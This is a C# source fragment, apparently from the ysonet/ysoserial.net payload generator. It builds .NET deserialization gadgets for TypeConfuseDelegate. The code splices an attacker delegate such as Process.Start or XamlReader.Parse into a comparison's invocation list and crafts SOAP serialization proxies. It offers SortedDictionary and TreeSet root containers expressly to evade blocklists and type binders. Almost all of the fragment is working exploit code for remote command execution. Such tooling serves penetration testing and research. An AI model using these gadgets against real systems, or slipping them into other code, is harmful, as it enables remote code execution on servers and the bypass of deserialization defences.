                info.AddValue("_comparison", comparison, typeof(object));
            }
        }

        [Serializable]
        private sealed class SoapDelegateEntryProxy : ISerializable
        {
            private readonly string delegateType;
            private readonly string delegateAssembly;
            private readonly string targetAssembly;
            private readonly string targetType;
            private readonly string method;
            private readonly SoapDelegateEntryProxy next;

            internal SoapDelegateEntryProxy(string delegateType, string delegateAssembly,
                string targetAssembly, string targetType, string method,
                SoapDelegateEntryProxy next)
            {
                this.delegateType = delegateType;
                this.delegateAssembly = delegateAssembly;
                this.targetAssembly = targetAssembly;
                this.targetType = targetType;
                this.method = method;
                this.next = next;
            }

            private SoapDelegateEntryProxy(SerializationInfo info, StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only SOAP delegate-entry proxy is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(RequireSoapType(typeof(object).Assembly,
                    "System.DelegateSerializationHolder+DelegateEntry"));
                info.AddValue("type", delegateType);
                info.AddValue("assembly", delegateAssembly);
                info.AddValue("target", null);
                info.AddValue("targetTypeAssembly", targetAssembly);
                info.AddValue("targetTypeName", targetType);
                info.AddValue("methodName", method);
                info.AddValue("delegateEntry", next);
            }
        }

        [Serializable]
        private sealed class SoapDelegateProxy : ISerializable
        {
            private readonly SoapDelegateEntryProxy entry;
            private readonly MethodInfo attackerMethod;
            private readonly MethodInfo benignMethod;

            internal SoapDelegateProxy(Comparison<string> benignComparison, Delegate slot1)
            {
                if (slot1 == null)
                    throw new ArgumentNullException("slot1");
                if (benignComparison.Target != null || slot1.Target != null)
                    throw new ArgumentException("The direct TypeConfuseDelegate SOAP form "
                        + "requires static methods in both invocation-list slots.");

                benignMethod = benignComparison.Method;
                attackerMethod = slot1.Method;

                SoapDelegateEntryProxy benign = new SoapDelegateEntryProxy(
                    benignComparison.GetType().FullName,
                    benignComparison.GetType().Assembly.FullName,
                    benignMethod.DeclaringType.Assembly.FullName,
                    benignMethod.DeclaringType.FullName,
                    benignMethod.Name,
                    null);

                // DelegateSerializationHolder stores the entries as a reverse-linked list.
                // The physical head and method0 are the attacker; reconstruction restores the
                // logical invocation order benign comparison -> slot-1 method.
                entry = new SoapDelegateEntryProxy(
                    slot1.GetType().FullName,
                    slot1.GetType().Assembly.FullName,
                    attackerMethod.DeclaringType.Assembly.FullName,
                    attackerMethod.DeclaringType.FullName,
                    attackerMethod.Name,
                    benign);
            }

            private SoapDelegateProxy(SerializationInfo info, StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only SOAP delegate proxy is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(RequireSoapType(typeof(object).Assembly,
                    "System.DelegateSerializationHolder"));
                info.AddValue("Delegate", entry);
                info.AddValue("method0", attackerMethod);
                info.AddValue("method1", benignMethod);
            }
        }

        [Serializable]
        private sealed class SoapSetProxy : ISerializable
        {
            private readonly SoapComparisonComparerProxy comparer;
            private readonly string[] items;

            internal SoapSetProxy(SoapComparisonComparerProxy comparer, string[] items)
            {
                this.comparer = comparer;
                this.items = items;
            }

            private SoapSetProxy(SerializationInfo info, StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only SOAP set proxy is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                SetSoapAlias(info, SoapSetAliasNamespace, SoapSetAliasType);
                info.AddValue("Count", items.Length);
                info.AddValue("Comparer", comparer, typeof(object));
                info.AddValue("Version", items.Length);
                info.AddValue("Items", items, typeof(string[]));
            }
        }

        private static void SetSoapAlias(SerializationInfo info, string aliasNamespace,
            string aliasType)
        {
            info.FullTypeName = aliasNamespace + "." + aliasType;
            info.AssemblyName = aliasNamespace;
        }

        // The -c value can name a file holding the real command.
        private static void ReadCommandFromFile(InputArgs inputArgs)
        {
            string cmdFromFile = inputArgs.CmdFromFile;

            if (!string.IsNullOrEmpty(cmdFromFile))
            {
                inputArgs.Cmd = cmdFromFile;
            }
        }

        // SortedDictionary and TreeSet reject a duplicate key, and the two compared strings
        // ARE the two arguments to Process.Start. There is no way to make them distinct
        // without changing the command (appending a NUL would also break it), so this rare
        // input is refused with a clear message instead of silently altering the payload.
        //
        // Do NOT point the user at variant 1 as a workaround: SortedSet accepts the input but
        // silently drops the duplicate, so the serialized set holds ONE element, and on
        // deserialize SortedSet.AddIfNotPresent returns at the empty-root case without ever
        // calling the comparer. That payload generates and never fires. The only real fix is
        // for the two strings to differ.
        private static void RejectEqualKeys(IComparer<string> comp, string key1, string key2, string container)
        {
            if (comp.Compare(key1, key2) == 0)
                throw new ArgumentException(container + " requires the executable and argument "
                    + "strings to compare as distinct values (got \"" + key1 + "\" twice). "
                    + "Change the command so they differ: variant 1 accepts this input, but its "
                    + "SortedSet collapses to one element and that payload does not fire either.");
        }

        // The last step for every container: replace invocation-list slot 1 with the
        // attacker delegate, after the container has been filled while the comparison was
        // still benign.
        private static void SpliceSlot1(Comparison<string> d, Delegate slot1)
        {
            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            invoke_list[1] = slot1;
            fi.SetValue(d, invoke_list);
        }

        // The XAML path. Same delegate/type confusion, but slot 1 becomes
        // XamlReader.Parse(string) and the two elements are the XAML document and "".
        // Used by the hosted gadgets ActivitySurrogateDisableTypeCheck and
        // XamlAssemblyLoadFromFile.
        //
        // This object-returning API builds real closed-generic objects. It therefore cannot
        // be passed to SoapFormatter's stock writer; SerializeSoapXamlGadget below is the
        // direct-document twin for hosted gadgets.
        public static object GetXamlGadget(string xaml_payload)
        {
            return GetXamlGadget(xaml_payload, 1);
        }

        // container: 1 SortedSet (default, the original payload), 2 SortedDictionary,
        // 3 TreeSet. 2 and 3 exist for the same narrow evasion as the command-path
        // variants: a binder or blocklist that rejects the exact wire type name
        // System.Collections.Generic.SortedSet.
        //
        // The two elements are the XAML document and "", so unlike the command path they can
        // never collide: a XAML document is never empty. key1 is the document, and the builder
        // always writes key1 second, so it is the FIRST argument handed to XamlReader.Parse.
        // (That was already true when the order came from the strings, because "" sorts
        // smallest, which is why these payloads are byte-identical to the ones ysonet has
        // always produced.)
        public static object GetXamlGadget(string xaml_payload, int container)
        {
            Delegate slot1 = new Func<string, object>(System.Windows.Markup.XamlReader.Parse);
            return BuildConfusedContainer(container, CultureSensitiveCompare, slot1,
                xaml_payload, "", false);
        }

        // Direct SoapFormatter twin of GetXamlGadget. The final document exposes the same
        // native CLR4 SortedSet<string>/TreeSet<string> root and
        // ComparisonComparer<string>; the generation-only aliases do not survive. Container
        // 2 is a different, deeper generic graph and remains an explicit unsupported cell.
        public static object SerializeSoapXamlGadget(string xamlPayload, int container,
            InputArgs inputArgs)
        {
            Delegate slot1 = new Func<string, object>(System.Windows.Markup.XamlReader.Parse);
            return new TypeConfuseDelegateGenerator().SerializeSoapContainer(container,
                CultureSensitiveCompare, slot1, xamlPayload, "", false, inputArgs);
        }

        // The option name every gadget that exposes the container choice uses, so the
        // flag reads the same everywhere. "rootcontainer", not "container": this picks the
        // serialized ROOT of the payload graph, and a bare "container" reads like a
        // deployment container to anyone skimming the options.
        public const string RootContainerOptionName = "rootcontainer";

        // The XAML wrappers kept their original constant name; it is the same option.
        public const string XamlRootContainerOptionName = RootContainerOptionName;

        // The part of the help text that is true for every consumer, so one wording
        // describes the choice and each gadget only adds what is specific to it.
        public const string RootContainerOptionHelp =
            "Serialized root container: 1 -> SortedSet [default], 2 -> SortedDictionary, "
            + "3 -> TreeSet. 2 and 3 evade a binder or blocklist that rejects the exact "
            + "SortedSet wire type name.";

        public const string XamlRootContainerOptionHelp =
            "Serialized root container of the TypeConfuseDelegate wrapper: "
            + "1 -> SortedSet [default], 2 -> SortedDictionary, 3 -> TreeSet. 2 and 3 evade "
            + "a binder or blocklist that rejects the exact SortedSet wire type name. "
            + "SoapFormatter supports 1 and 3, not 2. Not "
            + "used by the TextFormattingRunProperties wrapper (variant 2), which has no "
            + "container. The (2) formatter annotation counts wrapper variants, not "
            + "root-container choices.";

        // Shared strict parser for that option. Not the usual
        // int.TryParse(v, out container) shortcut: that silently turns "nope" or "9" into
        // the default container, which would hide a typo behind a payload the user did not
        // ask for.
        public static int ParseRootContainerOption(string value)
        {
            int parsed;
            if (!int.TryParse(value, out parsed) || parsed < 1 || parsed > 3)
                throw new OptionException(RootContainerOptionName + " must be 1, 2, or 3",
                    RootContainerOptionName);
            return parsed;
        }

        // Kept as the name the XAML wrappers already call.
        public static int ParseXamlRootContainerOption(string value)
        {
            return ParseRootContainerOption(value);
        }

    }
}
